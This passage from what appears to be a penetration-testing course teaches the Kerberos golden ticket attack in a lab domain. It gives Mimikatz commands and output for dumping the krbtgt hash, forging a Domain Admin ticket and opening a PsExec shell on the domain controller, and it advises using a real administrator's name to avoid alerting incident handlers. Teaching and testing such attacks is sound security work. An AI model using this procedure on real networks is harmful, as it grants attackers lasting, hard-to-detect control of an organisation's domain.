Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called _krbtgt_.

If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or _golden tickets_.

For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and the domain controller will trust it since it is correctly encrypted.

We must carefully protect stolen krbtgt password hashes since it grants unlimited domain access. Consider obtaining the client's permission before executing this technique.

This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the krbtgt account password is not automatically changed.

In fact, this password is only changed when the domain functional level is upgraded from Windows 2003 to Windows 2008. Because of this, it is not uncommon to find very old krbtgt password hashes.

The _Domain Functional Level_ dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller. Higher functional levels enable additional features, functionality, and security mitigations.

To test this persistence technique, we will first attempt to laterally move from the Windows 10 workstation to the domain controller via PsExec as the Offsec user.

This should fail as we do not have the proper permissions:

```
C:\Tools\active_directory> psexec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access dc01:
Access is denied.
```

At this stage of the engagement, we should have access to an account that is a member of the Domain Admins group or we have compromised the domain controller itself.

With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz. 

To simulate this, we'll log in to the domain controller via remote desktop using the jeff_admin account, run Mimikatz from the C:\\Tools folder, and issue the lsadump::lsa command as displayed below:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : e2b475c11da2a0748290d87aa966c327

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 75b60230a2394a812000dbfad8415965
...
```

Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. We'll take the hash and continue the procedure from a compromised workstation.

Before generating the golden ticket, we'll delete any existing Kerberos tickets with kerberos::purge.

We'll supply the domain SID (which we can gather with whoami /user) to the Mimikatz kerberos::golden command to create the golden ticket. This time we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash. We will set the golden ticket's username to fakeuser. This is allowed because the domain controller trusts anything correctly encrypted by the krbtgt password hash.

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
User      : fakeuser
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt
Lifetime  : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
```

Mimikatz provides two sets of default values when using the golden ticket option, namely the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.

With the golden ticket injected into memory, we can launch a new command prompt with misc::cmd and again attempt lateral movement with PsExec.

```
C:\Users\offsec.corp> psexec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2
   IPv4 Address. . . . . . . . . . . : 192.168.1.110
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
...

C:\Windows\system32> whoami
corp\fakeuser

C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                        Type             Attributes   
================================== ================ ==================================
Everyone                          Well-known group Mandatory group, Enabled by default
BUILTIN\Administrators            Alias            Mandatory group, Enabled by default
BUILTIN\Users                     Alias            Mandatory group, Enabled by default
...
NT AUTHORITY\Authenticated Users  Well-known group Mandatory group, Enabled by default
NT AUTHORITY\This Organization    Well-known group Mandatory group, Enabled by default
CORP\Domain Admins                Group            Mandatory group, Enabled by default
CORP\Group Policy Creator Owners  Group            Mandatory group, Enabled by default
CORP\Schema Admins                Group            Mandatory group, Enabled by default
CORP\Enterprise Admins            Group            Mandatory group, Enabled by default
...
Mandatory Label\High Mandatory Level  Label                          
```

We have an interactive command prompt on the domain controller and notice that the whoami command reports us to be the user fakeuser, which does not exist in the domain. Listing group memberships shows that we are a member of multiple powerful groups including the Domain Admins group. Excellent.

The use of a non-existent username may alert incident handlers if they are reviewing access logs. In order to reduce suspicion, consider using the name and ID of an existing system administrator.

Note that by creating our own TGT and then using PsExec, we are performing the _overpass the hash_ attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.

```
C:\Users\Offsec.corp> psexec.exe \\192.168.1.110 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.1.110:
Access is denied.
```